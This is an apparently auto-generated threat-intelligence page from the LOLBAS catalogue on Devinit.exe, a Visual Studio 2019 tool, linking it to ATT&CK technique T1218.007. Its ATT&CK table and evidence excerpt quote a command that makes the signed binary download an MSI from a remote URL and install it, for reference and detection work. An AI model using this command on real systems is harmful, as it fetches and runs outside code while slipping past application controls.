---
parsed_by: focuslocust
source: lolbas
type: generated
---
# Devinit.exe

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `devinit.exe` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/Devinit.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

Visual Studio 2019 tool

## Fast Retrieval

- Platform: `windows`
- Command page: [commands](../../commands/windows/devinit.md)
- Source verification: [source record](../../sources/lolbas/devinit.exe.md)

## Aliases

- `Devinit.exe`
- `devinit.exe`

## Related ATT&CK Techniques

| Item | Relationship | Confidence | Evidence |
| --- | --- | --- | --- |
| [T1218.007 - Msiexec](../../attack/techniques/T1218.007-msiexec.md) | explicit | source | Command metadata lists T1218.007: devinit.exe run -t msi-install -i {REMOTEURL:.msi} |

## Detection / Analysis Notes

This source record contains detection or analysis material. It is preserved on the source-record page rather than promoted into a full detection engineering page.

[source record](../../sources/lolbas/devinit.exe.md)

## Source Verification

[source record](../../sources/lolbas/devinit.exe.md)

## Evidence Excerpt

```text
Acknowledgement:
- Handle: '@mrd0x'
Person: mr.d0x
Author: mr.d0x
Commands:
- Category: Execute
Command: devinit.exe run -t msi-install -i {REMOTEURL:.msi}
Description: Downloads an MSI file to C:\Windows\Installer and then installs it.
```
